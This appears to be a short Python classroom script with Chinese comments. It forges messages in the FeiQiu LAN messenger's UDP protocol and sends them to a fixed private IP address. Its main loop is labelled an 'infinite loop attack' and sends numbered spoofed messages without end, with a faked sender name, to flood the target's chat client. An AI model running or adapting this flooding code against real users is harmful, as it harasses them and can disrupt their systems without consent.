# 飞秋
# 使用UDP协议模仿飞秋发送数据
import socket

# 1.建立socket对象
# 基于UDP协议
feiqiu = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
# 飞秋解码模式
info = "1:234:黑客:黑客:32:helloworld!"     # 14是IP地址  后面是发送内容
# 不需要绑定地址,不需要链接,直接发送
# feiqiu.sendto(info.encode("GBK"),("10.20.158.38",2425))

i = 0
# 无限循环攻击
while True:
	i += 1
	info = "1:234:python1812:易志康:32:helloworld"  + str(i)
	feiqiu.sendto(info.encode("GBK"), ("10.20.158.12", 2425))


